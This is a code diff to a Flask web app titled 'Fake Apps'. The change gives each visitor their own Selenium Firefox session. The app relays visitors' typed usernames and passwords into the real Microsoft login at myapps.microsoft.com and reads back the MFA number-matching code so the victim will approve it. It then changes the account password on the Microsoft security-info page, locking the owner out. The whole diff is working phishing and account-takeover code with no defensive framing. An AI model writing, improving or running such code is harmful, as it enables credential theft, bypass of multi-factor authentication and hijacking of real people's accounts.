@@ -23,29 +23,29 @@ def INDEX_PAGE(): return render_template("index.html", title="Fake Apps", header
 
 session_count = 0
 drivers = []
-driver = None
+def driver(): return drivers[session["id"]]
 
 def change_password():
-    driver.get("https://mysignins.microsoft.com/security-info/password/change")
-    new_password_field = WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
-    confirm_password_field = driver.find_element(By.NAME, "newPasswordConfirm")
+    driver().get("https://mysignins.microsoft.com/security-info/password/change")
+    new_password_field = WebDriverWait(driver(), 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
+    confirm_password_field = driver().find_element(By.NAME, "newPasswordConfirm")
 
     new_password_field.send_keys(NEW_PASSWORD())
     confirm_password_field.send_keys(NEW_PASSWORD())
 
-    submit_button = driver.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
+    submit_button = driver().find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
     submit_button.click()
 
     session["password_changed"] = True
 
 def get_authentication_code():
     try:
-        authentication_code = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
+        authentication_code = WebDriverWait(driver(), 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
         return authentication_code.text
 
     except:
         try:
-            resend_request = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
+            resend_request = WebDriverWait(driver(), 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
             resend_request.click()
             return get_authentication_code()
 
@@ -53,11 +53,11 @@ def get_authentication_code():
             return False
 
 def enter_field(field_name, value, error_id, clear):
-    field = WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
+    field = WebDriverWait(driver(), 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
     field.send_keys(value, Keys.RETURN)
 
     try:
-        error = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, error_id)))
+        error = WebDriverWait(driver(), 5).until(EC.presence_of_element_located((By.ID, error_id)))
 
         if clear:
             field.clear()
@@ -84,7 +84,6 @@ def index():
 def login():
     global session_count
     global drivers
-    global driver
 
     if "id" not in session:
         session["id"] = session_count
@@ -92,9 +91,7 @@ def login():
         session["password_changed"] = False
 
         drivers.append(webdriver.Firefox(service = WEB_DRIVER_SERVICE()))
-        drivers[session["id"]].get("https://myapps.microsoft.com")
-
-    driver = drivers[session["id"]]
+        driver().get("https://myapps.microsoft.com")
 
     name_form = NameForm()
     password_form = PasswordForm()
@@ -125,9 +122,9 @@ def login():
             change_password()
 
         try:
-            WebDriverWait(driver, 4).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
+            WebDriverWait(driver(), 4).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
 
         except:
-            driver.quit()
+            driver().quit()
 
         return redirect(url_for("index"))
